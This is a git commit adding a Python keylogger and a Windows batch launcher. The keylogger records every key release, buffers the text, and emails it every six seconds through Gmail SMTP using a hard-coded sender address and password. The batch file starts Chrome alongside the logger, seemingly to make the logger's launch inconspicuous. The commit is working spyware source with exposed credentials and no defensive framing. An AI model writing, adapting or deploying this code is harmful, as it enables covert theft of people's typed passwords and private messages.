a075be9adb73fb4dcc7e2a1c8ab2a99d23a86b7c
aish0007 <aishkanodia437@gmail.com>
2020-03-21 19:21:22 +0530

    first commit

---
+++ Automatic_keylogger.py
@@ -0,0 +1,57 @@
+import keyboard
+import smtplib
+from threading import Semaphore, Timer
+
+
+SEND_REPORT_EVERY = 6
+EMAIL_ADDRESS = "pricetracker358@gmail.com"
+EMAIL_PASSWORD = "google.co."
+global email1
+
+
+
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = ""
+        self.semaphore = Semaphore(0)
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email1, message)
+        print("email sent")
+        server.quit()
+
+
+    def report(self):
+        if self.log:
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+        self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        self.semaphore.acquire()
+
+if __name__ == "__main__":
+    email1 = input()
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
---
+++ auto.bat
@@ -0,0 +1,4 @@
+@echo off
+
+start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+start "" "C:\Users\aishk\Desktop\Automatic-Keylogger-and-email\Automatic_keylogger.py"
